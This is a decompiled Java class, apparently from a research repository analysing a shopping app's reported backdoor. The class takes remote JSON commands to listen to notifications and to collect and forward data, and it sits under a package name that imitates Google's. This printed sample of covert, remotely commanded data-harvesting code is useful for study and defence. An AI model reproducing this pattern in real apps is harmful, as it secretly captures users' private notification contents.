package com.google.android.sd.biz_dynamic_dex.ud_notification_listener;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.text.TextUtils;
import com.google.android.sd.biz_dynamic_dex.base.DynamicCmdExecutor;
import com.google.android.sd.biz_dynamic_dex.base.a;
import org.json.JSONObject;

public class UdNotificationListenerExecutor extends DynamicCmdExecutor {
  public void realExecute(Context paramContext, String paramString) {
    JSONObject jSONObject = new JSONObject(paramString);
    paramString = jSONObject.optString("work_type");
    if (TextUtils.equals(paramString, "listen"))
      (new b()).a(paramContext, jSONObject); 
    if (TextUtils.equals(paramString, "collect")) {
      a a = new a();
      a.a = jSONObject.optString("uuid");
      IntentFilter intentFilter = new IntentFilter("send_data");
      paramContext.registerReceiver(a.b, intentFilter);
      Intent intent = new Intent("collect_data");
      intent.setPackage(paramContext.getPackageName());
      paramContext.sendBroadcast(intent);
      a.a((Runnable)new Object(a, paramContext));
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\ab8ed4c3482c42a1b8baef558ee79deb-dex2jar.jar!\com\google\android\sd\biz_dynamic_de\\ud_notification_listener\UdNotificationListenerExecutor.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */